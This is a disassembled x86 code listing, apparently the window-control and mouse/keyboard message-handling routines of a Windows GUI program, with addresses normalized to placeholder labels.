mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_43e0d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43e108
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_43e1a0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_453eac
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_453eac
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43cac0
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45d658
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403454
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_453df0
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403454
jmp r-xdata
sub_43e334
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4088fc
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408928
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43cac0
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408740
call sub_4086dc
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4086dc
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_43e3dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_43e40c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_43e3d0
push ebp
call sub_43e3dc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43e45c
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_43e4e8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_43e520
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43dfa0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_453d60
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403454
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_453d60
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403454
sub_43e5a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43ca90
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43d158
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_43e520
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_43e5f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43ca90
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_43e60c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43ca90
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43d158
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43e520
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403454
sub_43e664
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_43df40
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43ded4
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43df40
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_43e700
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43e520
pop esi
pop ebx
retn
sub_43e725
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43e520
pop esi
pop ebx
retn
sub_43e74b
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43e520
pop esi
pop ebx
retn
sub_43e775
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43e520
pop esi
pop ebx
retn
sub_43e7a0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_43e7d0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_43dfa0
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_453d60
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403454
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_453d60
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403454
sub_43e848
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_43e880
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_453d60
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403454
sub_43e8b8
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43d158
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43e880
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4069fc
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403454
sub_43e930
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43e880
pop esi
pop ebx
retn
sub_43e950
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43e880
pop esi
pop ebx
retn
sub_43e970
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_453d60
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403454
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_4480a4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43e9c8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43d148
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43d158
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_43e0d4
pop esi
retn
sub_43ea08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_43e108
sub_43eab6
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_43d368
mov cl 0x1
sub_43eaf8
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43d0c0
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43d0c0
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_43eb28
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_43eb4c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_4069fc
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403454
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_43e0d4
mov [ ebx + 0xc ] eax
sub_43ebf0
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43d014
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43d014
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43ec84
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4031a0
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_43c6b4
mov edx [ esp ]
mov eax esi
call sub_43c690
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43c93c
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43c980
sub_43ed08
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412ae8
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43ca38
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_412b38
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43c8e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ed94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43ec84
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_443708
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_43ed08
pop ecx
jmp r-xdata
sub_43edf4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43eee2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eee9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43cf50
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43cf20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43cf20
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4043b4
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403ffc
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43ce40
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_43eef0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403454
sub_43ef1c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43ef3c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43ef5c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43ef7c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43ef9c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43efbc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43efdc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419e7c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43c574
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403454
sub_43f014
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f0b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4145e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_4495ec
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_449724
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cf20
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_449484
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_449844
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f0b7
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_43f0c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_43f0fc
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
